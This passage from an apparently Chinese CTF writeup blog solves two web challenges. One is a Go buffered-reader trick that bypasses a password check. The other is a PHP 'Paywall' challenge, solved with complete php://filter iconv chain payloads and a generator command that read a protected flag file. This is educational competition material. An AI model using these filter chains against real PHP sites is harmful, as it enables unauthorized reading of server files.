class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">justReadIt</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line">	body, err := ioutil.ReadAll(r.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;bad request\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reqData := ReadOrderReq&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> err := json.Unmarshal(body, &amp;reqData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;invalid body\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(reqData.Orders) &gt; MaxOrders &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;whoa there, max 10 orders!\n&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	reader := bytes.NewReader(randomData)</span><br><span class="line">	validator := NewValidator()</span><br><span class="line"></span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	<span class="keyword">for</span> _, o := <span class="keyword">range</span> reqData.Orders &#123;</span><br><span class="line">		<span class="keyword">if</span> err := validator.CheckReadOrder(o); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">			w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;error: %v\n&quot;</span>, err)))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ctx = WithValidatorCtx(ctx, reader, <span class="keyword">int</span>(o))</span><br><span class="line">		_, err := validator.Read(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">			w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;failed to read: %v\n&quot;</span>, err)))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := validator.Validate(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;validation failed: %v\n&quot;</span>, err)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	w.WriteHeader(<span class="number">200</span>)</span><br><span class="line">	w.Write([]<span class="keyword">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接收一个完全由数字组成的int数组，字段名叫orders</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ReadOrderReq <span class="keyword">struct</span> &#123;</span><br><span class="line">	Orders []<span class="keyword">int</span> <span class="string">`json:&quot;orders&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后会用randomData初始化一个reader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reader := bytes.NewReader(randomData)</span><br></pre></td></tr></table></figure><p>而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initRandomData</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(<span class="number">1337</span>)</span><br><span class="line">	randomData = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">24576</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := rand.Read(randomData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">copy</span>(randomData[<span class="number">12625</span>:], password[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化之后会遍历<code>reqData.Orders</code></p><p>调用<code>CheckReadOrder</code>检查oders中的int值范围是否在0-100</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">CheckReadOrder</span><span class="params">(o <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> o &lt;= <span class="number">0</span> || o &gt; <span class="number">100</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid order %v&quot;</span>, o)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后根据数值读出指定位数的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx = WithValidatorCtx(ctx, reader, <span class="keyword">int</span>(o))</span><br><span class="line">_, err := validator.Read(ctx)</span><br></pre></td></tr></table></figure><p>再往下就是最关键的地方，如果这里的validate校验过了才能拿到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := validator.Validate(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">		w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;validation failed: %v\n&quot;</span>, err)))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	w.WriteHeader(<span class="number">200</span>)</span><br><span class="line">	w.Write([]<span class="keyword">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br></pre></td></tr></table></figure><p>这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">Validate</span><span class="params">(ctx context.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	r, _ := GetValidatorCtxData(ctx)</span><br><span class="line">	buf, err := v.Read(WithValidatorCtx(ctx, r, <span class="number">32</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> bytes.Compare(buf, password[:]) != <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">&quot;invalid password&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就算全取最大100，10个也才1000，距离我们的12625还差很远</p><p>再往前看发现read之前</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">Read</span><span class="params">(ctx context.Context)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	r, s := GetValidatorCtxData(ctx)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, s)</span><br><span class="line">	_, err := r.Read(buf)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;read error: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有这样一个调用，如果size大于等于100会调用一个bufio.NewReader</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetValidatorCtxData</span><span class="params">(ctx context.Context)</span> <span class="params">(io.Reader, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	reader := ctx.Value(reqValReaderKey).(io.Reader)</span><br><span class="line">	size := ctx.Value(reqValSizeKey).(<span class="keyword">int</span>)</span><br><span class="line">	<span class="keyword">if</span> size &gt;= <span class="number">100</span> &#123;</span><br><span class="line">		reader = bufio.NewReader(reader)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> reader, size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个defaultBufSize是4096</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewReader returns a new Reader whose buffer has the default size.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> NewReaderSize(rd, defaultBufSize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117125832912.png" alt="image-20230117125832912"></p><h2 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h2><p>想看原理的移步陆队之前写的，我是脚本小子</p><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/#toc_iconv-filter-chain">https://tttang.com/archive/1395/#toc_iconv-filter-chain</a></p><p>本题是用php实现的一个blog系统，除开样式读取核心代码非常简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line">        set_include_path(<span class="string">&#x27;articles/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$article_content</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$article_content</span>, <span class="string">&#x27;PREMIUM&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="comment">// <span class="doctag">TODO:</span> implement subscriptions</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (strpos(<span class="variable">$article_content</span>, <span class="string">&#x27;FREE&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;article&gt;<span class="subst">$article_content</span>&lt;/article&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nothing here&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，对于文章内容前是<code>PREMIUM</code>的不能读取，<code>FREE</code>的则可以读</p><p>很可惜我们的flag文件恰好前面也是<code>PREMIUM</code>，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117141026989.png" alt="image-20230117141026989"></p><p>下面是工具</p><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p><a target="_blank" rel="noopener" href="https://github.com/WAY29/php_filter_chain_generator">https://github.com/WAY29/php_filter_chain_generator</a></p><p>发现直接生成出来的虽然有FREE，但是都无法看了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FREE�B�5$TԕT���FV��F�F��U�E�7V&#x27;65##�u�C��W%��7w5�W&quot;����&gt;==�@C������&gt;==�@</span><br></pre></td></tr></table></figure><p>然而发现把每个环节的<code>convert.iconv.UTF8.UTF7</code>去掉</p><p>就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号<code>!&#123;&#125;!</code>之类的)，因此第一步事先base64enccode一下</p><p>最终得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p>但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个</p><p>看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164606331.png" alt="image-20230117164606331"></p><p>当然最后发现工具也可以直接用，注意后面有俩空格</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;FREE  &#x27;</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag</span><br></pre></td></tr></table></figure><p>本脚本小子觉得很有意思就是了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164803115.png" alt="image-20230117164803115"></p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023-IdekCTF-Writeup"><span class="toc-number">1.</span> <span class="toc-text">2023 IdekCTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-Manager"><span class="toc-number">1.2.</span> <span class="toc-text">Task Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">非预期读文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF1"><span class="toc-number">1.2.0.1.1.</span> <span class="toc-text">姿势1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF2"><span class="toc-number">1.2.0.1.2.</span> <span class="toc-text">姿势2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E6%9C%9FRCE"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">预期RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF1-1"><span class="toc-number">1.2.0.2.1.</span> <span class="toc-text">姿势1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF2-1"><span class="toc-number">1.2.0.2.2.</span> <span class="toc-text">姿势2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proxy-viewer"><span class="toc-number">1.3.</span> <span class="toc-text">Proxy viewer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleFileServer"><span class="toc-number">1.4.</span> <span class="toc-text">SimpleFileServer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadMe"><span class="toc-number">1.5.</span> <span class="toc-text">ReadMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Paywall"><span class="toc-number">1.6.</span> <span class="toc-text">Paywall</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&text=2023IdekCTFWriteup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&is_video=false&description=2023IdekCTFWriteup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=2023IdekCTFWriteup&body=Check out this article: https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&title=2023IdekCTFWriteup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&name=2023IdekCTFWriteup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/&t=2023IdekCTFWriteup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2024 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>